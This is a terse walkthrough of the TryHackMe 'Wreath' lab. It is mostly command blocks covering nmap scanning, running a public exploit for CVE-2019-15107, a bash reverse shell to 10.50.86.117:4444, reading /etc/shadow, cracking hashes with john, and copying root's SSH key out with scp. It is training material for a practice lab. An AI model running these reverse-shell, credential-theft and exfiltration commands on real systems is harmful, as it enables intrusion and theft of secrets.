# Wreath

**Room Link:** [https://tryhackme.com/r/room/wreath](https://tryhackme.com/r/room/wreath)



## Enumeration

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
echo $VICTIM thomaswreath.thm >> /etc/hosts
```



## Exploitation

**Kali**

```
git clone https://github.com/MuirlandOracle/CVE-2019-15107
cd CVE-2019-15107 && pip3 install -r requirements.txt
sudo apt install python3-pip
chmod +x ./CVE-2019-15107.py
./CVE-2019-15107.py $VICTIM
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
nc -nlvp 4444
```

**Victim**

```
bash -i >& /dev/tcp/10.50.86.117/4444 0>&1
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
ctrl + Z
stty raw -echo;fg
```

**Victim**

```
cat /etc/shadow
cat /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

No passwords came up

**Kali**

```
unshadow passwd shadow > passwords.txt
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```



**Victim**

```
cd /root/.ssh/
scp id_rsa root@10.50.86.117:/root/
```

**Kali**

```
chmod 600 id_rsa
ssh -i id_rsa root@$VICTIM
```





## Enumeration



























